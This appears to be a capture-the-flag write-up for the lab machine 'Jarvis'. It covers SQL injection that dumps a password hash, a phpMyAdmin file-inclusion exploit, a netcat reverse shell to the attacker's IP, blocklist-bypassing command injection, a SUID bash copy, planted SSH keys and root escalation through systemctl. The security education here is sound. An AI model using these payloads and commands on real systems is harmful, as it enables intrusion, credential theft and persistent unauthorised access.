Jarvis was the first box I ever touched, and I think it has a good range of vulnerabilties and attack surfaces.
<!--more-->
**Summary**
**User** - A website is vulnerable to SQL injection, allowing credential gathering for PHPMyAdmin. PHPMyAdmin has a RFI vulnerability allowing for PHP RCE, giving a shell. A bad sudo rule gives us elevation to user.

**Root** - We have permission to create a custom service which runs as root.
## User
### Enumeration
Starting off with a standard `nmap` scan. Normally I'd leave one running to scan all ports aggressively, but it wasn't necessary in this case.
```
root@clubby789:~# nmap writeup.htb -v
[ ... ]
Discovered open port 80/tcp on 10.10.10.143 <- Web (HTTP)
Discovered open port 22/tcp on 10.10.10.143 <- SSH
```
Web is open, so I'll add `10.10.10.143 supersecurehotel.htb` to /etc/hosts (this was the hostname in the banner of the website)
### Website
The website appears to be a site advertising 'Stark Hotel'. Before running page discovery scripts like `dirb`, I decided to look around manually. The main page that caught my interest was `/room.php`, which took the GET paramater `cod`. By playing with this, I found I could break the output with a non-existent room.
![Rooms](/assets/jarvis1.png)
 This looked like SQL injection, so I fired up SQLMap.
```
root@clubby789:~/boxes/jarvis# sqlmap -u http://supersecurehotel.htb/room.php?cod=10
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.2.10#pip}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[ ... ]

[14:16:52] [INFO] GET parameter 'cod' appears to be 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)' injectable 
```

It was at this point the output stopped, I checked the site, and lo and behold:
![Banned](/assets/jarvis2.png)
It appears we'll get banned for any heavy requesting on the `room.php` page, so we'll have to do this manually.
### SQL Injection
 Via trial and error, I found that `cod=100 UNION SELECT 1,2,3,4,5,6,7;-- -` populated some of the fields in the page, meaning we have 7 columns in the SELECT.
 ![Banned](/assets/jarvis3.png)
 By comparing the output to `cod=1`, we can see that 5 is the picture, 2 is the room title, 3 is the price, and 4 is the description.

I used this information to explore the db, and eventually managed to dump credentials with `SELECT 1, user,3, 4,password, 6, 7 from mysql.user;-- -`. Using this, we get the info
`DBadmin:2D2B7A5E4E637B8FBA1D17F40318F277D29964D0`. Taking this over to [https://crackstation.net/](https://crackstation.net/), we find that this password is `imissyou`. But where to use this? I set off `dirb` to enumerate pages (we only get banned for heavy requests on `room.php`, the rest of the site is fair game).
```
root@clubby789:~/boxes/jarvis# dirb http://supersecurehotel.htb

```
We have PHPMyAdmin! Let's log in.

### PHPMyAdmin
The page title reveals the version as PHPMyAdmin 4.8.0. There is an LFI/RCE exploit for this, explained [here](https://medium.com/@happyholic1203/phpmyadmin-4-8-0-4-8-1-remote-code-execution-257bcc146f8e). We can demonstrate this with `http://supersecurehotel.htb/phpmyadmin/index.php?target=db_sql.php%3f../../../../../../../etc/passwd`, which gives use the contents of the `passwd` file. 
 
 ![/etc/passwd](/assets/jarvis4.png)

Originally, I tried session log poisoning, but I couldn't get it to include my sessionfile. Luckily, I found the Metasploit module `exploit/multi/http/phpmyadmin_lfi_rce`, which drops us a Meterpreter session. I personally don't like using Meterpreter to enumerate, so I found `nc -e` was allowed, ran `nc -e /bin/bash IP 8888` to get a shell back, then `python -c 'import pty;pty.spawn("/bin/bash")'`, and finally `Ctrl-Z, stty raw -echo, fg` to get a full tty shell.

### Privesc to user
At this point we have a shell as www-data. I tried `sudo -l` to see if we had a quick path to root/user, and luckily got
```
www-data@jarvis:/usr/share/phpmyadmin$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```
So we can run `simpler.py` as `pepper`, I wonder what that is?
```
www-data@jarvis:/usr/share/phpmyadmin$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -s

Statistics
-----------
Number of Attackers: 1
Most Risky:
    10.10.14.38 - Attack Level : 4 Request: : GET /room.php?cod=10
Most Recent: 10.10.14.38 --> 2020-02-05 09:43:44 : GET /phpmyadmin/server_privileges.php?viewing_mode=server&ajax_request=true&ajax_page_request=true&_nocache=158091381603427055&token=6JB99T%40w%27%3ET4E9O7
```
Seems to be a frontend for the SQLi bruteforce prevention from earlier. A quick look around the script reveals:
```
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```
So it runs `ping <user input>`.  Seems like simple command injection, but a lot of the standard characters for command chaining are blocked. Luckily, they forgot some.
 ![Banned](/assets/jarvis5.png)
 By including `$(command)`, our command is executed before the ping, which means no worrying about ensuring that the ping doesn't fail. To get a quick shell as `pepper`, I ran `$(cp /bin/bash /tmp/clubsh)` followed by `$(chmod u+s /tmp/clubsh)`. This copies `bash` to `/tmp` and then sets the SUID bit on it, meaning it will run as `pepper`. I have to call it with `/bin/clubsh -p` to force it not to drop privileges.
 ```
clubsh-4.4$ id
uid=33(www-data) gid=33(www-data) euid=1000(pepper) groups=33(www-data)
```
Our effective UID is 1000, meaning we can run commands as `pepper`. From here, I created `/home/pepper/.ssh`, echoed my public key to `authorized_keys`, and now I can SSH in.
```
pepper@jarvis:~$ ls
user.txt  Web
pepper@jarvis:~$ cat user.txt 
2afa3.....
```
And we've owned User.
## Root
### Local Enumeration
I first uploaded `linpeas.sh` to quickly find anything interesting. It found a list of SUID files:
```
====================================( Interesting Files )=====================================
[+] SUID
[ ... ]
/bin/systemctl <- Highlighted
[ ... ]
```

`systemctl` has SUID set, so we can run it as root. Using the awesome resource gtfobins.github.io, we find [https://gtfobins.github.io/gtfobins/systemctl/](https://gtfobins.github.io/gtfobins/systemctl/).
Excerpt:
```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```
If we paste this sample script in, we get 
```
pepper@jarvis:~$ cat /tmp/output 
uid=0(root) gid=0(root) groups=0(root)
```
so we wrote to a file as root! Time to hijack this for a full shell! 
### systemctl Hijacking
By simply chaning the command to `mkdir /root/.ssh; cp /home/pepper/.ssh/authorized_keys /root/.ssh/authorized_keys`, I copy my ssh public key into root's directory, and we can now ssh straight in as root.
```
root@jarvis:~# cat root.txt 
d41d8c.....
```
Root owned!

## Final Notes
The first part of this box was the hardest IMO, as it forced me not to rely on automated tools to enumerate credentials. Beyond that, the steps were fairly simple, but good for introducing simple command injection and SUID hijacking for privilege escalation.
